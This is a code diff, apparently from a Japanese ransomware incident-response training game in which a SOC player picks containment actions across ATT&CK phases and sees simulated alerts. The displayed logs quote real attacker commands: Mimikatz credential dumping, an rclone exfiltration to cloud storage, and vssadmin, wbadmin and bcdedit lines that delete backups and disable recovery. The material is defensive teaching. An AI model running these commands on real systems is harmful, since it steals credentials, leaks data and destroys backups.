+        label: 'B: 発信元IPのみをFWでブロック',
+        desc: '192.168.1.45（PC-UTSUGARI）からの通信をFWルールで遮断する。',
+        risk: 'med',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応B] PC-UTSUGARI からの通信をFWブロック', 'action');
+          await sleep(1000);
+          log('Firewall', 'b-warn', 'WARNING', '192.168.1.45 をブロック。ただし攻撃者はすでに収集した別アカウントで活動継続しています。', 'warn');
+          updateStats(-5, 0, 0);
+          await phase3();
+        }
+      },
+      {
+        label: '— 何もしない（内部スキャンは誰かのIT作業かも）',
+        desc: '社内からのスキャンなので誤検知かもしれない。確認せず様子を見る。',
+        risk: 'high',
+        isNothing: true,
+        action: async () => {
+          log('SOC', 'b-warn', 'SKIPPED', '[対応なし] 内部スキャンを無視', 'warn');
+          await sleep(1000);
+          log('AD Monitor', 'b-crit', 'ALERT', '攻撃者が Active Directory の全管理者アカウント情報の取得を完了しました。', 'crit');
+          setAsset('ad', 'compromised', '情報取得済み');
+          updateStats(-20, -10, 0);
+          await phase3();
+        }
+      }
+    ]
+  );
+}
+
+// ══ PHASE 3: 権限昇格 ═════════════════════════════════════════
+async function phase3() {
+  const danger = !state.p1_contained;
+  setPhase(3, danger ? 'danger' : 'active');
+  await sleep(1500);
+  divider('PHASE 3 — 権限昇格 (T1003: Credential Dumping)', danger ? 'danger' : 'phase');
+  await sleep(600);
+
+  if (danger) {
+    log('Sysmon [Event ID:10]', 'b-crit', 'ALERT',
+      `プロセスメモリへの不正アクセスを検知<br>
+       アクセス先: <span style="color:#fca5a5"><b>lsass.exe</b></span>（Windowsの認証情報を管理するコアプロセス）<br>
+       アクセス元: <span style="color:var(--orange)">svchost.exe</span>（実体: Mimikatz）<br>
+       <span class="log-code"><span class="hr">privilege::debug</span>
+<span class="hr">sekurlsa::logonpasswords</span>
+<span class="hd">→ 管理者の平文パスワード・ハッシュを取得中...</span></span>`, 'crit');
+  } else {
+    log('Sysmon [Event ID:10]', 'b-warn', 'WARNING',
+      `lsass.exe への弱いアクセス試行を検知（隔離済みPCからのRPC経由）<br>
+       隔離措置によりC2通信は遮断済みのため、本格的なダンプは失敗しています。`, 'warn');
+    log('EDR', 'b-ok', 'INFO', 'PC-UTSUGARI の隔離が有効。Mimikatz の実行に必要な特権昇格を阻止しています。', 'ok');
+  }
+
+  setTech(`
+    <div class="tech-ph-title">認証情報の窃取・権限昇格</div>
+    <div class="tech-attck">ATT&CK: T1003.001 — LSASS Memory Dump</div>
+    <div class="tech-desc">
+      Windowsの認証を管理する <b>lsass.exe</b> のメモリから、管理者のパスワードや認証ハッシュを直接読み取ります。
+      <b>パスワードを知らなくてもドメイン全体を掌握</b>できるようになります（Pass-the-Hash攻撃）。
+      ${state.p1_contained ? 'PC隔離によりC2通信が遮断されているため、攻撃者の活動は制限されています。' : ''}
+    </div>
+    <div class="impact-head">いま何が起きているか</div>
+    <ul class="impact-list">
+      ${danger ? '<li>IT管理者・ドメイン管理者のハッシュを取得中</li><li>パスワードなしで全サーバーへのログインが可能に</li><li>ドメイン管理者権限を奪えれば全PCへの命令が可能に</li>' : '<li>隔離措置によりMimikatz実行は制限されている</li><li>ただし偵察済みの情報で限定的な攻撃は依然可能</li>'}
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 対策ポイント</div>
+      <p>Credential Guard（仮想化保護）、Protected Usersグループ、<b>lsass.exeへの外部プロセスアクセスを禁止するEDRポリシー</b>が有効です。</p>
+    </div>
+  `);
+
+  showChoices(
+    danger
+      ? '⚠ lsass.exeへの不正アクセスを検知。管理者パスワードが窃取された可能性があります。'
+      : '⚠ lsass.exeへのアクセス試行を検知。隔離措置が有効ですが、念のため追加対応を検討してください。',
+    [
+      {
+        label: 'A: 全管理者アカウントを即時無効化・パスワード変更',
+        desc: '窃取された可能性のある全管理者の認証情報を一斉無効化。攻撃者のアクセスを断つ。',
+        risk: 'low',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応A] 全管理者アカウント 強制パスワードリセット', 'action');
+          await sleep(1000);
+          log('AD Admin', 'b-ok', 'SUCCESS', '管理者アカウント8件をリセット完了。Kerberosチケットもパージしました。', 'ok');
+          await sleep(400);
+          log('SOC', 'b-warn', 'NOTICE', '業務影響: 一時的にシステムログインが不可。IT部門での調整が必要です。', 'warn');
+          state.p3_creds_reset = true;
+          updateStats(5, 0, -10);
+          score += 1;
+          setAsset('ad', '', '再保護済');
+          await phase4();
+        }
+      },
+      {
+        label: 'B: Mimikatz プロセスを強制終了',
+        desc: 'Mimikatz の実行プロセスをKillして攻撃ツールを停止させる。',
+        risk: 'med',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応B] Mimikatz プロセスを強制終了', 'action');
+          await sleep(1000);
+          log('EDR', 'b-warn', 'WARNING', 'プロセスを停止。ただし実行完了前だったか不明。ハッシュが取得済みの可能性が残ります。', 'warn');
+          updateStats(-10, 0, 0);
+          await phase4();
+        }
+      },
+      {
+        label: '— 何もしない（lsass.exeへのアクセスは通常でもある）',
+        desc: 'lsass.exeはWindowsコアプロセス。正常な動作の一部かもしれないと判断して放置。',
+        risk: 'high',
+        isNothing: true,
+        action: async () => {
+          log('SOC', 'b-warn', 'SKIPPED', '[対応なし] lsass.exeへのアクセスを無視', 'warn');
+          await sleep(800);
+          if (danger) {
+            log('AD Audit', 'b-crit', 'ALERT', '攻撃者がドメイン管理者権限を完全掌握。全サーバーへのアクセスが可能になりました。', 'crit');
+            setAsset('ad', 'compromised', '完全掌握');
+          } else {
+            log('AD Audit', 'b-warn', 'WARNING', '限定的なアクセス試行を確認。隔離措置により本格侵害は抑制されています。', 'warn');
+          }
+          updateStats(-25, -15, 0);
+          await phase4();
+        }
+      }
+    ]
+  );
+}
+
+// ══ PHASE 4: 横断拡散 ═════════════════════════════════════════
+async function phase4() {
+  // 封じ込め度を判定
+  const wellContained = state.p1_contained && state.p3_creds_reset;
+  const partiallyContained = state.p1_contained || state.p3_creds_reset || state.p2_ad_secured;
+  const danger = !partiallyContained;
+
+  setPhase(4, danger ? 'danger' : 'active');
+  await sleep(1500);
+  divider('PHASE 4 — 横断拡散 (T1021: Lateral Movement)', danger ? 'danger' : 'phase');
+  await sleep(600);
+
+  if (wellContained) {
+    log('Network Monitor', 'b-ok', 'INFO', '横断移動の試みを検知しましたが、認証情報リセット・PC隔離により全てブロックされています。', 'ok');
+    await sleep(800);
+    log('EDR', 'b-ok', 'SUCCESS', '攻撃者はドメイン管理者権限を持っていないため、GPO経由の拡散は不可能です。', 'ok');
+    setAsset('pc', 'safe', '全台 保護中');
+    setAsset('file', '', '正常稼働');
+    updateStats(5, 5, 0);
+    score += 1;
+    state.p4_net_isolated = true; // 実質的に封じ込め完了
+  } else if (danger) {
+    log('Domain Controller', 'b-crit', 'ALERT',
+      `GPO（グループポリシー）が不正変更されました<br>
+       変更者: <span style="color:#fca5a5">MAMORU\\backup_svc</span>（不正アカウント）<br>
+       <span class="log-code"><span class="hr">→ 全端末にバックドアスクリプトを一斉配布中</span></span>`, 'crit');
+    await sleep(1000);
+    log('SIEM', 'b-crit', 'CRITICAL', '社内45台のPC すべてへの感染拡大を確認しました。', 'crit');
+    setAsset('pc', 'compromised', '全45台 侵害済み');
+    setAsset('file', 'compromised', 'アクセス侵害');
+    updateStats(-25, -15, 0);
+  } else {
+    log('Network Monitor', 'b-warn', 'WARNING',
+      `SMB経由での横断移動を検知<br>
+       192.168.1.45 → <span style="color:var(--orange)">192.168.1.20（ファイルサーバー）</span> への大量アクセス`, 'warn');
+    await sleep(1000);
+    log('File Server', 'b-warn', 'WARNING', 'ファイルサーバーの共有フォルダへの不審なアクセスを検知。設計データへのブラウジングが急増しています。', 'warn');
+    setAsset('file', 'warn', '不審アクセス検知');
+  }
+
+  setTech(`
+    <div class="tech-ph-title">ラテラルムーブメント（横断移動）</div>
+    <div class="tech-attck">ATT&CK: T1021.002 — SMB / Windows Admin Shares</div>
+    <div class="tech-desc">
+      奪取した管理者権限を使い、社内の他サーバーへ「正規のログイン」として侵入していきます。
+      ドメイン管理者権限があれば<b>GPOで全PCに一斉展開</b>も可能です。
+      ${wellContained ? '<b>今回は早期対応により、この拡散を効果的に防ぐことができています。</b>' : ''}
+    </div>
+    <div class="impact-head">いま何が起きているか</div>
+    <ul class="impact-list">
+      ${wellContained
+        ? '<li>横断移動の試みはすべてブロックされた</li><li>ファイルサーバー・バックアップは無事</li>'
+        : danger
+          ? '<li>全45台のPCへ感染拡大完了（GPO経由）</li><li>ファイルサーバーの全データに到達</li><li>バックアップサーバーへの経路も掌握</li>'
+          : '<li>ファイルサーバーへの不正アクセスが進行中</li><li>設計図面・顧客データへのアクセスを試みている</li>'
+      }
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 対策ポイント</div>
+      <p>ネットワークセグメンテーション、最小権限の原則、管理者共有の無効化。<b>早期封じ込めが横断拡散を根本的に防ぎます。</b></p>
+    </div>
+  `);
+
+  if (wellContained) {
+    // 封じ込め成功 → Phase5へ（データ流出も限定的）
+    showChoices(
+      '✓ 横断拡散を阻止しました。しかし攻撃者がすでに収集した情報で限定的な活動を試みる可能性があります。',
+      [
+        {
+          label: 'A: ネットワーク全体をVLAN隔離して完全封鎖',
+          desc: '念のため全セグメントを分離。攻撃者の残存活動を根絶する。業務は一時停止。',
+          risk: 'low',
+          action: async () => {
+            log('SOC', 'b-action', 'DECISION', '[対応A] 全ネットワークをVLAN隔離', 'action');
+            await sleep(800);
+            log('Network Ops', 'b-ok', 'SUCCESS', 'VLAN隔離完了。攻撃者の残存活動を完全に封鎖しました。', 'ok');
+            score += 1;
+            updateStats(5, 0, -10);
+            await phase5_contained();
+          }
+        },
+        {
+          label: 'B: 監視強化のみ（業務継続を優先）',
+          desc: 'フォレンジック調査を進めながら業務を継続。追加の隔離は行わない。',
+          risk: 'med',
+          action: async () => {
+            log('SOC', 'b-action', 'DECISION', '[対応B] 監視強化で継続', 'action');
+            await sleep(800);
+            log('SIEM', 'b-warn', 'WARNING', '監視を強化しました。残存リスクはありますが業務継続しています。', 'warn');
+            updateStats(0, 0, 0);
+            await phase5_contained();
+          }
+        }
+      ]
+    );
+  } else {
+    showChoices(
+      danger
+        ? '⚠ 全端末への感染拡大を検知。ファイルサーバーも侵害されています。緊急対応が必要です。'
+        : '⚠ ファイルサーバーへの不審なアクセスを検知。侵害が進行中の可能性があります。',
+      [
+        {
+          label: 'A: ネットワーク全体をセグメント隔離する',
+          desc: '感染拡大を物理的に阻止。VLANで部門間を分断する。業務は一時停止する。',
+          risk: 'low',
+          action: async () => {
+            log('SOC', 'b-action', 'DECISION', '[対応A] 全ネットワークをセグメント隔離', 'action');
+            await sleep(1000);
+            log('Network Ops', 'b-ok', 'SUCCESS', 'VLAN隔離完了。感染拡大を阻止しました。業務影響: 全社一時停止。', 'ok');
+            await sleep(400);
+            log('SOC', 'b-warn', 'NOTICE', '侵害済みのサーバーはフォレンジック調査が必要です。', 'warn');
+            state.p4_net_isolated = true;
+            updateStats(5, 0, -15);
+            score += 1;
+            setAsset('pc', 'offline', '全セグメント分離');
+            await phase5_partial(danger);
+          }
+        },
+        {
+          label: 'B: ファイルサーバーのみ隔離する',
+          desc: 'ファイルサーバーを切り離しデータへのアクセスを遮断。業務影響を最小限にする。',
+          risk: 'med',
+          action: async () => {
+            log('SOC', 'b-action', 'DECISION', '[対応B] ファイルサーバーをネットワーク隔離', 'action');
+            await sleep(1000);
+            log('Network Ops', 'b-ok', 'SUCCESS', 'ファイルサーバー (192.168.1.20) を隔離しました。', 'ok');
+            log('SIEM', 'b-warn', 'WARNING', '攻撃者は他のサーバーへの移動を継続しています。', 'warn');
+            updateStats(-10, 0, 0);
+            setAsset('file', 'offline', '隔離済み');
+            await phase5_partial(danger);
+          }
+        },
+        {
+          label: '— 何もしない（業務が止まるのは困る）',
+          desc: 'ネットワーク隔離は業務に大きな影響が出る。経営層の承認を取ってから対応する。',
+          risk: 'high',
+          isNothing: true,
+          action: async () => {
+            log('SOC', 'b-warn', 'SKIPPED', '[対応なし] 業務継続を優先して放置', 'warn');
+            await sleep(1000);
+            log('File Server', 'b-crit', 'ALERT', '攻撃者がファイルサーバーの全共有フォルダにアクセス権を取得。データ収集を開始しています。', 'crit');
+            setAsset('file', 'compromised', '全データ到達済み');
+            setAsset('backup', 'compromised', '到達済み');
+            updateStats(-30, -20, 0);
+            await phase5_full();
+          }
+        }
+      ]
+    );
+  }
+}
+
+// ══ PHASE 5A: 封じ込め成功ルート（データ流出なし・暗号化なし）══
+async function phase5_contained() {
+  setPhase(5, 'stopped');
+  await sleep(1500);
+  divider('PHASE 5 — 攻撃を封じ込めました', 'ok');
+  await sleep(600);
+
+  log('SOC / CISO', 'b-ok', 'SUCCESS',
+    `<b style="color:var(--green)">攻撃者のランサムウェア展開を未然に阻止しました</b><br>
+     PC隔離・認証情報リセット・ネットワーク隔離が連携し、攻撃チェーンを遮断。<br>
+     データ流出: <span style="color:var(--green)">なし</span> / ファイル暗号化: <span style="color:var(--green)">なし</span>`, 'ok');
+
+  await sleep(1000);
+  log('Forensics', 'b-normal', 'INFO', '宇津狩氏PCのフォレンジック調査を開始。バックドアの詳細を解析中です。', '');
+  await sleep(800);
+  log('Legal / CISO', 'b-ok', 'SUCCESS', '個人情報漏洩なし。規制当局への報告義務は発生しません。', 'ok');
+
+  setAsset('email', '', '正常稼働');
+  setAsset('pc', 'safe', '調査中（1台）');
+  setAsset('ad', 'safe', '保護済み');
+  setAsset('file', 'safe', '正常稼働');
+  setAsset('backup', 'safe', '正常稼働');
+  updateStats(10, 10, 0);
+
+  setTech(`
+    <div class="tech-ph-title">✓ 攻撃チェーンの遮断成功</div>
+    <div class="tech-attck">ATT&CK: Kill Chain — Successfully Interrupted</div>
+    <div class="tech-desc">
+      早期の意思決定がランサムウェアの発動を防ぎました。
+      フィッシング侵入後の<b>PC隔離 → 認証情報リセット → ネットワーク隔離</b>という
+      連続した対応が攻撃者の侵攻を各段階で封じ込めた結果です。
+    </div>
+    <div class="impact-head" style="color:var(--green);">今回の対応がうまくいった理由</div>
+    <ul class="impact-list" style="">
+      <li style="color:#6ee7b7;">Phase1でのPC隔離がC2通信を断ち切った</li>
+      <li style="color:#6ee7b7;">認証情報リセットでPass-the-Hash攻撃を無効化した</li>
+      <li style="color:#6ee7b7;">ネットワーク隔離で残存リスクを根絶した</li>
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 次に備えて</div>
+      <p>今回の侵入経路（フィッシングメール）の分析、<b>MFAの全面導入</b>、フォレンジック結果をもとにしたルール改善を行いましょう。</p>
+    </div>
+  `);
+
+  showResultBtn('success');
+}
+
+// ══ PHASE 5B: 部分封じ込めルート（データ流出あり・暗号化あり）══
+async function phase5_partial(wasFullControl) {
+  setPhase(5, 'danger');
+  await sleep(1500);
+  divider('PHASE 5 — データ流出 (T1567: Exfiltration to Cloud)', 'danger');
+  await sleep(600);
+
+  const vol = wasFullControl ? 800 : 300;
+  state.exfil_mb = vol;
+
+  log('DLP / Network Monitor', 'b-crit', 'ALERT',
+    `大量データの外部転送を検知<br>
+     プロセス: <span style="color:var(--orange)">svchost.exe</span>（実体: Rclone — 正規同期ツールを悪用）<br>
+     転送先: <span style="color:#fca5a5"><b>userstorage.mega.co.nz</b></span>（HTTPS 443ポート）<br>
+     <span class="log-code"><span class="hr">rclone copy \\\\srv-file\\Confidential remote:exfil --transfers=8</span>
+<span class="hd">→ 転送量: ${vol}MB 経過中</span></span>`, 'crit');
+
+  await sleep(1000);
+  setAsset('file', 'compromised', `${vol}MB 流出中`);
+  updateStats(-15, -20, 0);
+
+  setTech(`
+    <div class="tech-ph-title">クラウド経由のデータ流出</div>
+    <div class="tech-attck">ATT&CK: T1567.002 — Exfiltration to Cloud Storage</div>
+    <div class="tech-desc">
+      ネットワーク隔離によって感染拡大は抑えられましたが、隔離前に侵害されたサーバーから
+      <b>データ流出が始まっています。</b>Rcloneをsvchost.exeに偽装し、HTTPS通信で外部に転送します。
+      早期隔離により被害量は大幅に抑えられています。
+    </div>
+    <div class="impact-head">いま何が起きているか</div>
+    <ul class="impact-list">
+      <li>侵害済みサーバーから${vol}MBのデータが流出中</li>
+      <li>流出量は全面被害（3.2GB以上）と比べて大幅に少ない</li>
+      <li>インターネット遮断で流出をここで止めることができる</li>
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 対策ポイント</div>
+      <p>外部インターネット接続の即時遮断が最も効果的。<b>業務停止を恐れずに実行することが被害を最小化します。</b></p>
+    </div>
+  `);
+
+  showChoices(
+    `⚠ ${vol}MBのデータが外部クラウドに転送中。今すぐ流出を止めることができます。`,
+    [
+      {
+        label: 'A: 外部インターネット接続を全遮断する',
+        desc: '組織のインターネット接続を即時遮断。データ流出を強制停止。業務は完全停止。',
+        risk: 'low',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応A] 外部インターネット接続を全遮断', 'action');
+          await sleep(1000);
+          log('Network Ops', 'b-ok', 'SUCCESS', `外部通信を遮断。データ転送を停止しました。流出量: ${vol}MB で抑制。`, 'ok');
+          await sleep(500);
+          log('Legal', 'b-warn', 'NOTICE', '個人情報が含まれる場合、個人情報保護委員会への報告が必要です。', 'warn');
+          state.p5_exfil_stopped = true;
+          state.exfil_mb = vol;
+          updateStats(5, -10, -10);
+          score += 1;
+          await phase6_partial();
+        }
+      },
+      {
+        label: 'B: 転送先ドメインをFWブロックする',
+        desc: 'ファイアウォールでMEGA.nzへのアクセスを遮断する。業務影響を最小限にする。',
+        risk: 'med',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応B] MEGA.nz へのFWブロック実施', 'action');
+          await sleep(1000);
+          log('Firewall', 'b-warn', 'WARNING', 'MEGA.nz をブロック。攻撃者は即座にGoogle Drive APIへ切り替えました。転送継続中です。', 'warn');
+          state.exfil_mb = vol * 2;
+          updateStats(-10, -15, 0);
+          await phase6_partial();
+        }
+      },
+      {
+        label: '— 何もしない（HTTPS通信なので確証がない）',
+        desc: '暗号化通信のため内容が分からない。誤検知を疑って様子を見る。',
+        risk: 'high',
+        isNothing: true,
+        action: async () => {
+          log('SOC', 'b-warn', 'SKIPPED', '[対応なし] 大容量外部通信を放置', 'warn');
+          await sleep(1200);
+          log('DLP', 'b-crit', 'ALERT', `データ流出が完了しました。総流出量: ${vol*3}MB`, 'crit');
+          state.exfil_mb = vol * 3;
+          updateStats(-25, -25, 0);
+          await phase6_partial();
+        }
+      }
+    ]
+  );
+}
+
+// ══ PHASE 5C: 全面被害ルート ═════════════════════════════════
+async function phase5_full() {
+  setPhase(5, 'danger');
+  await sleep(1500);
+  divider('PHASE 5 — データ流出 (T1567: Exfiltration to Cloud)', 'danger');
+  await sleep(600);
+
+  const vol = 3200;
+  state.exfil_mb = vol;
+
+  log('DLP / Network Monitor', 'b-crit', 'ALERT',
+    `大量データの外部転送を検知<br>
+     プロセス: <span style="color:var(--orange)">svchost.exe</span>（実体: Rclone）<br>
+     転送先: <span style="color:#fca5a5"><b>userstorage.mega.co.nz</b></span>（HTTPS 443ポート）<br>
+     <span class="log-code"><span class="hr">rclone copy \\\\srv-file\\ALL remote:exfil --transfers=16</span>
+<span class="hd">→ 転送量: ${vol}MB（3.2GB）— 全データ網羅的に流出</span></span>`, 'crit');
+
+  await sleep(1000);
+  log('DLP', 'b-crit', 'ALERT',
+    `流出データ内訳:<br>
+     ・設計図面・技術仕様書: ${Math.round(vol*0.4)}MB<br>
+     ・顧客情報・取引先リスト: ${Math.round(vol*0.3)}MB<br>
+     ・財務データ・給与情報: ${Math.round(vol*0.3)}MB`, 'crit');
+
+  setAsset('file', 'compromised', `${vol}MB 流出中`);
+  updateStats(-20, -25, 0);
+
+  setTech(`
+    <div class="tech-ph-title">全データ流出（二重脅迫）</div>
+    <div class="tech-attck">ATT&CK: T1567.002 — Exfiltration to Cloud Storage</div>
+    <div class="tech-desc">
+      攻撃者は全ての共有フォルダへアクセス権を持っているため、<b>3.2GB以上のデータが網羅的に流出</b>しています。
+      「暗号化の前にデータを盗む」この手口を<b>二重脅迫（Double Extortion）</b>と呼びます。
+      身代金を払わなければデータを公開すると脅すためです。
+    </div>
+    <div class="impact-head">いま何が起きているか</div>
+    <ul class="impact-list">
+      <li>全設計図面・顧客情報・財務データが流出中</li>
+      <li>一度流出したデータは取り戻せない</li>
+      <li>暗号化と二重脅迫の両方が迫っている</li>
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 この段階でできること</div>
+      <p>今すぐインターネット接続を全遮断しても、すでに大量のデータが流出しています。<b>早期対応がいかに重要かを示す状況です。</b></p>
+    </div>
+  `);
+
+  showChoices(
+    `⚠ 3.2GBのデータが外部クラウドに転送中。手遅れに近いですが、今すぐ対応できることがあります。`,
+    [
+      {
+        label: 'A: 外部インターネット接続を全遮断する',
+        desc: '今からでも遮断。流出量をこれ以上増やさない。',
+        risk: 'low',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応A] 外部インターネット接続を全遮断', 'action');
+          await sleep(1000);
+          log('Network Ops', 'b-ok', 'SUCCESS', `外部通信を遮断。ただし約3GBはすでに流出済みです。`, 'ok');
+          state.p5_exfil_stopped = true;
+          updateStats(0, -10, -10);
+          await phase6_full();
+        }
+      },
+      {
+        label: '— 何もしない（もう手遅れかもしれない）',
+        desc: 'すでに大量流出しており対応しても無駄かもしれない。様子を見る。',
+        risk: 'high',
+        isNothing: true,
+        action: async () => {
+          log('SOC', 'b-warn', 'SKIPPED', '[対応なし] 放置継続', 'warn');
+          await sleep(1000);
+          log('DLP', 'b-crit', 'ALERT', 'データ流出が完了しました。全データが攻撃者サーバーに保存されました。', 'crit');
+          updateStats(-20, -20, 0);
+          await phase6_full();
+        }
+      }
+    ]
+  );
+}
+
+// ══ PHASE 6A: 部分被害エンド（暗号化発動） ════════════════════
+async function phase6_partial() {
+  setPhase(6, 'danger');
+  await sleep(1500);
+  divider('PHASE 6 — 暗号化・身代金要求 (T1486)', 'danger');
+  await sleep(600);
+
+  log('File System Monitor', 'b-crit', 'CRITICAL',
+    `ランサムウェアが起動しました（感染済みの端末から）<br>
+     <span class="log-code"><span class="hr">vssadmin.exe Delete Shadows /All /Quiet</span>  <span class="hd">← バックアップ削除</span>
+<span class="hr">wbadmin delete catalog -quiet</span>  <span class="hd">← カタログ削除</span></span>`, 'crit');
+
+  await sleep(1000);
+  setAsset('backup', 'destroyed', '削除済み ⚠');
+  updateStats(-10, 0, 0);
+
+  await sleep(800);
+  log('File System Monitor', 'b-crit', 'CRITICAL',
+    `ファイル暗号化が開始されました<br>
+     <span class="log-code">design_spec_v3.dwg<span class="hr"> → design_spec_v3.dwg.LKBT</span>
+customer_db_2024.sql<span class="hr"> → customer_db_2024.sql.LKBT</span></span>
+     <b>暗号化範囲: 侵害されたサーバーのみ（隔離されたシステムは保護）</b>`, 'crit');
+
+  await sleep(1000);
+  setAsset('file', 'destroyed', '暗号化（一部）');
+  setAsset('ad', 'compromised', '侵害済み');
+  updateStats(-15, -10, 0);
+
+  const fileCount = state.p4_net_isolated ? '約40,000件' : '約90,000件';
+  const downtime  = score >= 3 ? '1〜2週間' : '3〜4週間';
+  log('IT部門', 'b-crit', 'ALERT',
+    `<b style="color:var(--orange);">一部システムが暗号化されました。隔離済みシステムは無事です。</b><br>
+     暗号化ファイル数: ${fileCount}<br>
+     バックアップ: <span style="color:var(--red)">完全削除済み</span><br>
+     流出データ: <span style="color:var(--orange)">${state.exfil_mb}MB</span><br>
+     推定業務停止期間: ${downtime}`, 'crit');
+
+  setTech(`
+    <div class="tech-ph-title">部分的な暗号化被害</div>
+    <div class="tech-attck">ATT&CK: T1486 / T1490 — Data Encrypted for Impact</div>
+    <div class="tech-desc">
+      早期のネットワーク隔離により、暗号化の影響は<b>侵害されたサーバーのみ</b>に抑えられました。
+      隔離されたシステムはランサムウェアの到達を阻止できています。
+      バックアップは削除されましたが、被害範囲は限定的です。
+    </div>
+    <div class="impact-head">最終被害状況</div>
+    <ul class="impact-list">
+      <li>暗号化: ${fileCount}（隔離済みシステムは無事）</li>
+      <li>データ流出: ${state.exfil_mb}MB（全面被害の${Math.round(state.exfil_mb/32)}%以下）</li>
+      <li>バックアップ: 削除済みのため自力復旧は困難</li>
+      <li>業務停止期間の見込み: ${downtime}</li>
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 この判断から学ぶこと</div>
+      <p>早期のネットワーク隔離が全面被害を防ぎました。<b>オフラインバックアップがあれば復旧コストをさらに大幅削減</b>できました。</p>
+    </div>
+  `);
+
+  const f = document.getElementById('enc-flash');
+  f.style.display = 'block';
+  f.style.animation = 'enc-anim 0.3s steps(2) 4 forwards';
+  setTimeout(() => { f.style.display = 'none'; }, 1800);
+
+  await sleep(2000);
+  showResultBtn('ransom');
+  // 身代金は減額
+  document.querySelector('.rn-body').innerHTML = `
+    マモール株式会社の一部ファイルサーバーが暗号化されました。<br>
+    隔離により全面被害は防いだものの、復号なしには業務再開が困難です。<br><br>
+    <strong style="color:#fff; font-size:16px;">身代金: 15 BTC（約1億円）</strong><br>
+    お支払い期限：72時間以内
+  `;
+  document.querySelector('.rn-id').textContent = `VICTIM ID: MAMORU-2024-0B3F | DATA STOLEN: ${state.exfil_mb}MB`;
+}
+
+// ══ PHASE 6B: 全面被害エンド ══════════════════════════════════
+async function phase6_full() {
+  setPhase(6, 'danger');
+  await sleep(1500);
+  divider('PHASE 6 — 全面暗号化・身代金要求 (T1486)', 'danger');
+  await sleep(600);
+
+  log('File System Monitor', 'b-crit', 'CRITICAL',
+    `<b style="color:var(--red)">ランサムウェア本体が起動しました</b><br>
+     <span class="log-code"><span class="hr">vssadmin.exe Delete Shadows /All /Quiet</span>  <span class="hd">← バックアップ削除</span>
+<span class="hr">bcdedit.exe /set {default} recoveryenabled No</span>  <span class="hd">← 回復モード無効化</span>
+<span class="hr">wbadmin delete catalog -quiet</span>  <span class="hd">← カタログ削除</span></span>`, 'crit');
+
+  await sleep(1200);
+  setAsset('backup', 'destroyed', '完全削除済み ⚠');
+  updateStats(-15, 0, 0);
+
+  await sleep(800);
+  log('File System Monitor', 'b-crit', 'CRITICAL',
+    `全ファイル暗号化が開始されました — <b style="color:var(--red)">10,000件/分</b> で処理中<br>
+     <span class="log-code">design_spec_v3.dwg<span class="hr"> → design_spec_v3.dwg.LKBT</span>
+customer_db_2024.sql<span class="hr"> → customer_db_2024.sql.LKBT</span>
+financial_report.xlsx<span class="hr"> → financial_report.xlsx.LKBT</span></span>`, 'crit');
+
+  await sleep(1000);
+  setAsset('file', 'destroyed', '全ファイル暗号化');
+  setAsset('ad', 'destroyed', '暗号化済み');
+  setAsset('pc', 'destroyed', '全台 暗号化');
+  updateStats(-30, -20, 0);
+
+  await sleep(1200);
+  log('全サーバー', 'b-crit', 'RANSOM',
+    `<b style="color:var(--red); font-size:14px;">暗号化完了。業務継続が不可能な状態です。</b><br>
+     暗号化ファイル数: 約180,000件<br>
+     バックアップ: <span style="color:var(--red)">完全削除済み — 自力復旧は不可能</span><br>
+     流出済みデータ: <span style="color:var(--red)">${state.exfil_mb}MB — 攻撃者サーバーに保存済み</span><br>
+     推定業務停止期間: <b>4〜8週間</b>`, 'crit');
+
+  setTech(`
+    <div class="tech-ph-title">全面暗号化被害</div>
+    <div class="tech-attck">ATT&CK: T1486 / T1490 — Encrypted for Impact</div>
+    <div class="tech-desc">
+      攻撃者はまず<b>バックアップを消去してから</b>暗号化を実行します。
+      「以前のバージョンに戻す」手段を先に潰すためです。
+      暗号化はRSA-2048+AES-256で、<b>攻撃者の秘密鍵なしに復号は事実上不可能</b>です。
+      10,000件/分という速度では、検知から完全暗号化まで数分しかありません。
+    </div>
+    <div class="impact-head">最終被害状況</div>
+    <ul class="impact-list">
+      <li>全共有ファイル（約180,000件）が暗号化 — 業務完全停止</li>
+      <li>バックアップも削除済み — 自力復旧は不可能</li>
+      <li>データ流出: ${state.exfil_mb}MB — 二重脅迫の材料に</li>
+      <li>推定業務停止: 4〜8週間、復旧費用は数千万〜数億円規模</li>
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 根本的な対策</div>
+      <p>オフライン不変バックアップ（3-2-1ルール）、MFA全面導入、EDR整備、IRP策定と定期訓練。<b>早期封じ込めがこの結末を防ぎます。</b></p>
+    </div>
+  `);
+
+  const f = document.getElementById('enc-flash');
+  f.style.display = 'block';
+  f.style.animation = 'enc-anim 0.3s steps(2) 7 forwards';
+  setTimeout(() => { f.style.display = 'none'; }, 2800);
+
+  await sleep(2800);
+  showResultBtn('ransom');
+}
+
+// ══ 阻止成功エンド ════════════════════════════════════════════
+function showResultBtn(type) {
+  var w = document.getElementById('result-btn-wrap');
+  var b = document.getElementById('result-btn');
+  if (type === 'success') {
+    b.className = 'result-btn success';
+    b.textContent = '▶ 結果を確認する';
+    b.onclick = function(){ w.style.display='none'; showSuccess(); };
+  } else {
+    b.className = 'result-btn danger';
+    b.textContent = '▶ 結果を確認する';
+    b.onclick = function(){
+      w.style.display='none';
+      document.getElementById('end-screen').style.display='flex';
+      document.getElementById('ransom-note').style.display='block';
+    };
+  }
+  w.style.display='flex';
+}
+
+
+function buildScoreBadge(scoreVal, maxScore, gradeObj) {
+  const phaseLabels = ['P1\n侵入検知', 'P2\n偵察阻止', 'P3\n権限保護', 'P4\n拡散阻止', 'P5\n流出阻止'];
+  const dots = phaseLabels.map((lbl, i) => {
+    const cls = i < scoreVal ? 'hit' : 'miss';
+    return '<div class="gs-dot ' + cls + '" title="' + lbl.replace('\n', ' ') + '">' + (i < scoreVal ? '✓' : (i+1)) + '</div>';
